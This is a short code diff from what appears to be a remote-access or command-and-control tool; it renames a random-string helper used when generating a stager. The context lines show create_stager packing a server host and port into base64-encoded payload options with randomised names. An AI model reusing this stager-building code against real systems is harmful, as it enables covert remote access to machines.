@@ -60,7 +60,7 @@ def _get_random_user_agent() -> str:
     return random.choice(user_agents)
 
 
-def _get_random_string(size: int = random.randint(6, 15), numbers: bool = False) -> str:
+def get_random_string(size: int = random.randint(6, 15), numbers: bool = False) -> str:
     """:return: A randomly generated string of x characters."""
     result = ""
 
@@ -106,7 +106,7 @@ def create_stager(server_host: str, server_port: int, loader_options: dict) -> s
         else:
             raise
     """.format(
-        _get_random_string(), _get_random_string(numbers=True),
+        get_random_string(), get_random_string(numbers=True),
         b64encode("{}".format(json.dumps({
             "type": 0,
             "payload_options": {"host": server_host, "port": server_port},
